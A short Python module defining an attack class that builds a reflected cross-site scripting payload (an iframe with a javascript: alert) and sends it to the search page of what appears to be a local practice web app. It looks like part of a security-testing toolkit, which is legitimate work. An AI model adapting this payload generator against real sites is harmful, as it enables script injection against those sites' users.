from . import attack as a

class xss_search(a.attack_inter):
    def __init__(self, script=None):
        self.script = script
        

    def generator(self, myScript='<iframe src="javascript:alert(\'xss\')">'):
        #base_url = 'http://localhost:3000/rest/products/search'
        base_url = 'http://localhost:3000/#/search'
        params = '?q='+myScript  
        return base_url, params

    def run(self):
        if self.script:
            myURL,myparams = self.generator(self.script)
        else:
            myURL,myparams = self.generator()
        s = a.requests.Session()
        response = a.requests.Request('GET', myURL)
        p = response.prepare()
        p.url += myparams
        resp = s.send(p)
        print(resp.request.url)



